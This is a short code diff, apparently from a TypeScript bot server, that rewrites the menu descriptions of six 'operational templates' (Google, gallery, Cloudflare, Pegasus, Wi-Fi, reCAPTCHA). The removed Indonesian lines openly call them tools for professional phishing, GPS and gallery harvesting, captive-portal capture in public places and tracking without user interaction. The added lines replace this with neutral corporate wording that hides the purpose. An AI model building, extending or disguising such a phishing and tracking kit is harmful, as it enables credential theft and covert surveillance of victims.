@@ -345,12 +345,12 @@ async function startServer() {
                 `Pilih template operasional berikut:\n\n`;
       
       const tmplDesc: Record<string, string> = {
-        'google': '└ <i>Auth Identity flow. Cocok untuk phishing profesional.</i>',
-        'gallery': '└ <i>Audit Galeri & GPS. Module Izin Download & Wisata Galeri.</i>',
-        'cloudflare': '└ <i>DDoS Verification flow. Terlihat sangat teknis.</i>',
-        'pegasus': '└ <i>Kernel Terminal flow. Untuk target penyuka tech/hacking.</i>',
-        'wifi': '└ <i>Hotspot Captive Portal. Sangat efektif di tempat umum.</i>',
-        'recap': '└ <i>Invisible reCAPTCHA. Tracking tanpa interaksi tombol.</i>'
+        'google': '└ <i>Workspace Security Flow. Clean, corporate authentication.</i>',
+        'gallery': '└ <i>Asset Integrity Audit. Professional hardware verification.</i>',
+        'cloudflare': '└ <i>Edge Protection Flow. High-trust DDoS verification.</i>',
+        'pegasus': '└ <i>Kernel Diagnostic Tool. Technical system-level audit.</i>',
+        'wifi': '└ <i>Enterprise Captive Portal. High-trust public login.</i>',
+        'recap': '└ <i>Invisible Protection. Zero-touch background verification.</i>'
       };
 
       Object.entries(templates).forEach(([key, tmpl]) => {
